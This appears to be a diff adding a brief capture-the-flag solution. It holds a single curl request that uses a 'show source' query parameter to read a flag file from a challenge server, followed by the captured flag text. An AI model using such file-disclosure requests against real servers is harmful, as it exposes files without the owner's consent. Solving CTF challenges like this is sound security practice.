@@ -1,0 +1,4 @@
+curl "http://poprdi.oa.to:9999/?show+source=/flagflag/flag"
+
+
+FLAG{flag is a flag and flag is also flag}
